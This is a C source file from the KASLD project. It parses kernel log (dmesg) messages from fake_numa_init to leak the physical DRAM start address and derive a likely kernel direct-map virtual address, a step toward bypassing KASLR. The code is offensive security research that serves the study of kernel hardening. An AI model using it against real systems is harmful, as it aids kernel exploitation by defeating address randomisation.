// This file is part of KASLD - https://github.com/bcoles/kasld
//
// fake_numa_init() / dummy_numa_init() prints memblock_start_of_DRAM()
// physical address of the first memblock to dmesg on systems which do not
// support Non-Uniform Memory Access (NUMA).
//
// On systems with a known phys->virt offset mapping, this may be used to
// identify the kernel virtual address region used for direct mapping.
//
// NUMA support may be disabled in BIOS or via Linux kernel command line with
// the `acpi=off` flag. Systems without Advanced Configuration and Power
// Interface (ACPI) do not support NUMA.
//
// Requires:
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://cateee.net/lkddb/web-lkddb/NUMA.html
// https://elixir.bootlin.com/linux/v6.2-rc3/source/drivers/base/arch_numa.c#L429
// https://elixir.bootlin.com/linux/v6.2-rc3/source/arch/x86/mm/numa.c#L709
// https://elixir.bootlin.com/linux/v6.2-rc3/source/arch/loongarch/kernel/numa.c#L401
// https://elixir.bootlin.com/linux/v6.2-rc3/source/mm/memblock.c#L1663
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int on_match(const char *line, void *ctx) {
  unsigned long *result = ctx;

  /* NUMA: Faking a node at [mem 0x0000000080200000-0x00000000bfffffff] */
  const char *p = strstr(line, " [mem ");
  if (!p)
    return 1;

  char *endptr;
  unsigned long addr = strtoul(p + 5, &endptr, 16);
  if (addr && addr < KERNEL_VAS_END) {
    *result = addr;
    return 0;
  }
  return 1;
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for fake_numa_init() info ...\n");
  dmesg_search("NUMA: Faking a node at", on_match, &addr);

  if (!addr)
    return 1;

  printf("leaked faked NUMA NODE #0 physical address: 0x%016lx\n", addr);
  kasld_result(KASLD_ADDR_PHYS, KASLD_SECTION_DRAM, addr,
               "dmesg_fake_numa_init:dram");

#if !PHYS_VIRT_DECOUPLED
  unsigned long virt = phys_to_virt(addr);
  printf("possible direct-map virtual address: 0x%016lx\n", virt);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_DIRECTMAP, virt,
               "dmesg_fake_numa_init:directmap");
#else
  printf("note: phys and virt KASLR are decoupled on this arch; "
         "cannot derive kernel text virtual address from physical leak\n");
#endif

  return 0;
}
